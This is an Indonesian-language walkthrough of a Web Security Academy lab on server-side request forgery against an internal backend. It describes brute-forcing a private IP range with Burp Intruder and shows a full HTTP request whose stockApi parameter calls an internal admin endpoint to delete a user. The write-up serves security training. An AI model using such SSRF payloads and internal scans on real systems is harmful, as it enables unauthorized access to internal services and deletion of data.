<img width="1045" height="418" alt="image" src="https://github.com/user-attachments/assets/c7a052c8-9642-476a-b09e-8d4f961263e3" />

Dalam lab kali ini ada sebuah kerentanan SSRF namun ini bukan terpaku pada localhost tapi pada sistem backend lainnya. Artinya ada sebuah ip private yang menyediakan layanan untuk sistem backend internal. Namun kita sebagai penyerang bisa meminta server untuk membocorkan data lain atau mengakses halaman lain melalui ip internal tersebut alih-alih harus mengunjungi alamat ip tersebut yang tidak mungkin bisa karena bersifat tertutup.

<img width="1588" height="823" alt="image" src="https://github.com/user-attachments/assets/af188261-5aa7-401b-be95-ef2e7bd426c3" />
Sama seperti sebelumnya. Web ini melakukan fetch data melalui API internal sistem. Namun ternyata kita bisa akses sistem backend internal lain melalui request ini. Namun masalahnya kita tidak tahu alamat ip untuk layanan backend tersebut. Karena itu perlu intruder untuk menebak range dari bagian host id (bagian paling akhir ip) dari 1 - 255.

<img width="1595" height="896" alt="image" src="https://github.com/user-attachments/assets/5ed72c92-723c-4b4d-a5dc-0e4e8909644d" />
Setelah start attack biasanya akan menunggu waktu sedikit lama. Cari yang memberikan respons dengan status 200 OK atau 302 FOUND karena kita request parameter untuk delete user artinya server menerima permintaan tersebut dan payloads parameter untuk menghapus user berhasil

<img width="936" height="814" alt="image" src="https://github.com/user-attachments/assets/36291808-f687-4153-b7c5-af0cbf79cc9c" />
Contoh disini ada status 302 FOUND yang harusnya user berhasil terhapus. Coba inject payloads yang sama di hasil attack intruder ini ke tab proxy dan foward ulang atau kirim ke repeater dan send. Setelah itu refresh kembali halaman web

```
POST /product/stock HTTP/2
Host: 0a3800e804c91579804c7182001a002c.web-security-academy.net
Cookie: session=HZ9TcGlLNJWp9iK5ms9nB4rGYblLdNPF
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3800e804c91579804c7182001a002c.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Content-Length: 63
Origin: https://0a3800e804c91579804c7182001a002c.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers

stockApi=http://192.168.0.114:8080/admin/delete?username=carlos
```

<img width="1907" height="823" alt="image" src="https://github.com/user-attachments/assets/1b00dea1-a26e-4426-8318-f7b95415b74d" />

Yap lab nya berhasil ter-solve
